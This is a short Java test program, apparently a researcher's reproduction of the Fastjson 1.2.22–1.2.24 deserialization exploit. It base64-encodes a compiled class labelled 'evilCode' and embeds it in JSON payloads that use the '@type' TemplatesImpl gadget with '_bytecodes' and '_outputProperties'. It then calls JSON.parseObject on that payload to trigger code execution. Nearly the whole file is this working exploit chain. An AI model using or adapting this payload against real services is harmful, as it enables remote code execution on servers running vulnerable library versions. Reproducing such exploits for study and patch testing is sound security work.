package com.dmc.fastjsontest;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.dmc.fastjsontest.jsonTestBean.BugTest;
import com.dmc.fastjsontest.jsonTestBean.Simple;
import com.sun.org.apache.xml.internal.resolver.helpers.BootstrapResolver;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

/**
 * @Author:dingmc
 * @Description:
 * @Date: Created in 9:53 PM 2019/8/30
 * @Modified By:
 */
public class bugtest {
    public static String readClass(String cls) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)),bos);
        }catch(IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    //1.22-1.24, Feature.supportUnPublic
    public static void main(String[] args) {
        ParserConfig config = new ParserConfig();
        BootstrapResolver resolver = new BootstrapResolver();
        System.out.println(JSONObject.toJSONString(resolver));

        BugTest test = new BugTest();
//        test.setAge(12);
//        test.setName("Asdf");
//        System.out.println(JSONObject.toJSONString(test, SerializerFeature.WriteClassName));
        //com.dmc.fastjsontest.jsonTestBean.BugTest
        //com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
        String evilCode = readClass("/Users/dingmc/IdeaProjects/projectest/javaTest/src/main/java/com/dmc/fastjsontest/jsonTestBean/BugTest.class");
        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String z = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," + "\"_bytecodes\":[\"" + evilCode + "\"]," + "\"_encoding\":\"UTF-8\",\"_indent\":false,\"_indentamount\":-1,\"_isStandalone\":false,\"_omitHeader\":false,\"_version\":\"1.0\",\"age\":12,\"allowedProtocols\":\"all\",\"name\":\"Asdf\"}";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
            "\",\"_name\":\"a\",\"uRIResolver\":{},\"_bytecodes\":[\""+evilCode+"\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ }," +
            "\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
//        String text2 = "{\"@type\":\"" + NASTY_CLASS +
//            "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
//            "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);
//        System.out.println(text1);
//        Object user = JSONObject.parseObject(z);
//        System.out.println(user);
        Object obj = JSON.parseObject(text1, Feature.AllowUnQuotedFieldNames, Feature.AllowArbitraryCommas, Feature.AllowComment, Feature.AllowSingleQuotes);

    }
}
